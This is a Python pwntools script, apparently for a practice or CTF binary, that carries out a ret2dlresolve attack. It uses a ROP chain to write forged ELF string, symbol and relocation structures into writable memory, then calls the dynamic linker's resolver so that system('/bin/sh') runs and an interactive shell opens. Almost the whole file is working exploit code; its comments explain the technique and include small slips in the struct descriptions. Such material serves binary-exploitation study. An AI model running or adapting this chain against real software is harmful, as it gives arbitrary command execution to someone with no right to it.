from pwn import *

binary = args.BIN

e = context.binary = ELF(binary)
r = ROP(e)

p = process(e.path)

# want to push a fake reloc arg onto the stack and then call plt init

readelf = """
➜  ret2dlresolve-pwn readelf --sections ./resolve | egrep "Name|.rela.plt|.dynsym|.dynstr"
  [Nr] Name              Type             Address           Offset
  [ 6] .dynsym           DYNSYM           00000000004003c0  000003c0
  [ 7] .dynstr           STRTAB           0000000000400420  00000420
  [11] .rela.plt         RELA             00000000004004b8  000004b8
"""

readelf2 = """
➜  ret2dlresolve-pwn readelf -S resolve | grep plt
  [11] .rela.plt         RELA             00000000004004b8  000004b8
  [13] .plt              PROGBITS         0000000000401020  00001020
  [14] .plt.sec          PROGBITS         0000000000401040  00001040
  [24] .got.plt          PROGBITS         0000000000404000  00003000
"""

log.info(readelf)
log.info(readelf2)

pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]
ret = pop_rdi + 1
init_plt = 0x401020
symbtab = 0x4003c0
strtab = 0x400420
jmp_rel = 0x4004b8

writeable_mem = 0x00404020            # .data
fake_strtab = writeable_mem           # 8 bytes for 'system\0\0' & two 8 byte aligns
fake_symbtab = writeable_mem + 0x18   # 24 bytes for Elf64_Sym struct & one 8 byte align
fake_rel = writeable_mem + 0x38       # 24 bytes for Elf64_rel struct
fake_args = writeable_mem + 0x50      # 8 bytes for '/bin\sh\0'

'''
this calculates the index of our fake relocation entry relative to the actual .rela.plt section.
the division by 24 is because each Elf64_Rel structure is 24 bytes long
fake reloc arg points to our fake Elf64_Rel structure within the payload we send
once init plt gets called with this, it resolves our fake system symbol and calls it
'''
fake_reloc_arg = int((fake_rel - jmp_rel) / 0x18)

chain = cyclic(16)
chain += p64(ret)
chain += p64(pop_rdi)
chain += p64(writeable_mem)        # rdi = writeable_mem -> fake struct
chain += p64(e.plt['gets'])        # call gets to get our payload to .data
chain += p64(pop_rdi)              # set arg for system (rdi='/bin/sh\0')
chain += p64(fake_args)            # rdi = writeable_mem + 0x50 -> args -> '/bin/sh\0'
chain += p64(init_plt)             # call dynamic linker
chain += p64(fake_reloc_arg)       # argument for dynamic linker 'init_plt(fake_reloc_arg)'

p.sendline(chain)

'''
now we craft and send our payload 
the dynamic linker will follow the following trail to resolve the address of 'system\0\0'
fake_reloc_arg -> Elf64_Rel -> Elf64_Sym -> string table -> 'system\0\0'
'''

# sets up the fake string table entry (strtab)
payload = b'system\0\0'         # symbol name
payload += p64(0)               # 8 byte align                
payload += p64(0)               # 8 byte align   

# sets up fake symbol table entry pointing to 'system\0\0' (symtab)
payload += p32(fake_strtab - strtab)     # st_name = fake_strtab - strtab (p32(0) = 4 bytes)
payload += p8(0)                         # st_info                        (p8(0) = 1 byte)
payload += p8(0)                         # st_other                       (p16(0) = 2 bytes)            
payload += p16(0)                        # st_shndx
payload += p64(0)                        # st_value 
payload += p64(0)                        # st_size 
payload += p64(0)                        # padding 0x18 byte align

'''
r_info encodes both the symbol index and relocation type.
0x7 is the relocation type for JUMP_SLOT
writeable_mem as r_offset makes the linker write the resolved address there
'''
r_info = int((fake_symbtab - symbtab) / 0x18) << 32 | 0x7

# Elf64_Rel Struct (jmprel)
payload += p64(writeable_mem)      # r_offset 
payload += p64(r_info)             # r_info (reloc type and index)
payload += p64(0)                  # padding 0x18 byte align

log.info("hit enter to send '/bin/sh\0'")
pause()
payload += b'/bin/sh\0'

p.sendline(payload)

p.interactive()

# fake jmprel
# typedef struct {
#   Elf64_Addr      r_offset /* Address */
#   Elf_Xword       r_info   /* Reloc type and symbol index */
# } Elf64_Rel;

# fake symtab
# typedef struct {
#   Elf64_Word      st_name   /* Symbol name (string tbl index) */
#   unsigned char   st_info   /* Symbol type and binding */
#   unsigned char   st_info   /* Symbol visibility */
#   Elf64_Section   st_shndx  /* Section index */
#   Elf64_Addr      st_value  /* Symbol value */
#   Elf64_Xword     st size   / Symbol size */
# } Elf64_Sym;
